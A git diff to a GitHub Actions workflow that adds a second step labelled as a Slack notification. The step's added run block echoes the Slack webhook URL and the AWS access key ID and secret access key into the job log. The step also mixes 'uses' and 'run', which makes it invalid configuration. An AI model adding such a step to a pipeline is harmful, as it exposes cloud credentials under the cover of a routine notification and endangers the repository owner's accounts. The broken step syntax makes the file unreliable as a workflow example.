@@ -38,6 +38,23 @@ jobs:
           text: '🖖Validate project'
         env:
           SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
+
+      - name: slack
+        if: always()
+        uses: 8398a7/action-slack@v3
+        with:
+          status: ${{ job.status }}
+          fields: repo,message,commit,author,action,eventName,ref,workflow,job,took
+          text: '🖖Validate project'
+        run: |
+          echo "${{ secrets.SLACK_WEBHOOK_URL }} " ${{ secrets.SLACK_WEBHOOK_URL }}
+          echo "${{ secrets.SLACK_WEBHOOK_URL }} " ${{ secrets.AWS_ACCESS_KEY_ID }}
+          echo "${{ secrets.SLACK_WEBHOOK_URL }} " ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+        env:
+          SLACK_WEBHOOK_URL: ${{ secrets.SLACK_WEBHOOK_URL }}
+
+
+
 #      - name: Run the Action
 #        if: startsWith(github.ref, 'refs/heads/feature')
 #        uses: devops-infra/action-pull-request@v0.5.5
